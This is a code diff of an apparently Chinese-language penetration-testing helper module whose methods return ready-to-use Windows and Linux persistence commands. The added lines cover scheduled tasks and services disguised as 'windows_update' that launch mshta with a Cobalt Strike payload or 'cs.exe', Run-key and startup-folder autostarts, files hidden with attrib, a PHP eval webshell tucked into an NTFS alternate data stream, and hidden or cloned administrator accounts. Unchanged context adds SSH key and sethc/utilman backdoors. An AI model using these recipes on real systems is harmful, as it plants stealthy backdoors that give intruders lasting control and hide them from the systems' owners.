@@ -1,6 +1,7 @@
 # encoding: utf8
 from .config import *
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -8,7 +9,7 @@ class Shell:
             'Author': 'whois',
             'Update': '2019/7/06',
         }
-        
+
     def SSHKey(self):
         return """
 Metasploit Modules:
@@ -19,7 +20,6 @@ Step:
     2. cat id_rsa.pub >> /root/.ssh/authorized_keys (upload)
     3. ssh -i id_rsa root@hostname (local)
 """
-
 
     def AddUser(self):
         return """
@@ -54,7 +54,6 @@ Hacker:
     ssh root@hostname -p 65521
 """
 
-
     def Shift(self):
         return """
 sethc程序替换
@@ -67,13 +66,13 @@ utilman程序替换
     REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe" /t REG_SZ /v Debugger /d "C:\\windows\\system32\\cmd.exe" /f
 """
 
-
     def Schtasks(self):
         return """
 每分钟执行一次命令（只要当前任务存在就不会多执行，支持重启）
     schtasks /create /sc minute /mo 1 /tn "windows_update" /tr "mshta {0}"
 
-    schtasks /create /sc ONLOGON /F /RL HIGHEST /tn update /tr "calc.exe"
+    schtasks /create /sc ONLOGON /F /RL HIGHEST /tn 360update /tr "mshta {0}"
+
 
 立即执行一次
     schtasks /run /tn windows_update
@@ -82,4 +81,76 @@ utilman程序替换
     schtasks /delete /f /tn windows_update
 
 """.format(cobalt_hta)
+
+    def Services(self):
+        """
+        sc create windows_update binpath= "c:/cs.exe"
+        sc config windows_update start= auto
+        net start windows_update
+        sc delete windows_update
+
+        """
+        return """
+sc create windows_update binpath= "c:/cs.exe"&&sc config windows_update start= auto&&net start windows_update
         
+"""
+
+    def Reg(self):
+        return """
+windows系统的开机项位于注册表的：
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+
+查询
+    reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+    cobalt command：
+        reg query x86 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+        reg query x64 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+删除
+    reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v windows_update /f
+
+添加启动exe
+    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d "C:\cs.exe" /f
+
+排查
+    autoruns
+"""
+
+    def Startup(self):
+        return """
+copy "C:\\test.exe" "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe" /y
+
+attrib "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update" +s +h
+"""
+
+    def Hide(self):
+        return """
+windows隐藏文件
+    attrib "c:\1.exe" +s +h
+
+利用ADS隐藏webshell
+    echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg
+
+    排查：
+        dir /a
+
+"""
+
+    def AddUser(self):
+        return """
+简单添加隐藏账号
+    net user test$ 123!@#qwe /add
+    net localgroup administrators test$ /add
+
+克隆账号
+    powershell-import powershell-import  /Pentest/Post-Exploitation/Persistence/Create-Clone.ps1
+    powershell Create-Clone -u god$ -p 123!@#qwe -cu administrator
+
+    计算机管理、控制面板无用户信息
+
+    登录=administrator用户
+
+"""
